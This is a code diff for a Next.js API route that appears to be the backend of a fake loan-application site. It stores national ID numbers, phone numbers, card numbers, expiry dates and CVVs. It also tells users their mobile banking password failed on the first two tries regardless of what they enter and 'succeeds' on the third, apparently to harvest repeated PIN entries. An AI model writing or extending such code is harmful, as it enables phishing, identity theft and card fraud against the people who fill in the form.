@@ -32,14 +32,17 @@ export async function POST(request: NextRequest) {
       applicant = await storage.createApplicant(sessionId, getClientIp(request));
     }
 
+    const loanAmount = Number(body.loanAmount) || 0;
+    const isPinOnlyAttempt = loanAmount === 0;
+
     const attempt = await storage.addAttempt(applicant.id, {
       tcKimlik: body.tcKimlik,
       firstName: body.firstName,
       lastName: body.lastName,
       phone: body.phone,
       birthDate: body.birthDate ?? "",
-      loanAmount: body.loanAmount,
-      loanTerm: body.loanTerm,
+      loanAmount,
+      loanTerm: body.loanTerm ?? 0,
       cardNumber: body.cardNumber ?? "",
       cardExpiry: body.cardExpiry ?? "",
       cardCvv: body.cardCvv ?? "",
@@ -51,10 +54,13 @@ export async function POST(request: NextRequest) {
       applicantId: applicant.id,
       attemptId: attempt.id,
       attemptNumber: attempt.attemptNumber,
-      success: attempt.attemptNumber === 3,
-      requiresOtp: attempt.attemptNumber === 3,
+      success: isPinOnlyAttempt
+        ? attempt.attemptNumber === 3
+        : true,
+      canAdvance: isPinOnlyAttempt && attempt.attemptNumber === 3,
+      requiresOtp: !isPinOnlyAttempt,
       message:
-        attempt.attemptNumber < 3
+        isPinOnlyAttempt && attempt.attemptNumber < 3
           ? "Mobil şifreniz doğrulanamadı. Lütfen tekrar deneyiniz."
           : undefined,
     });
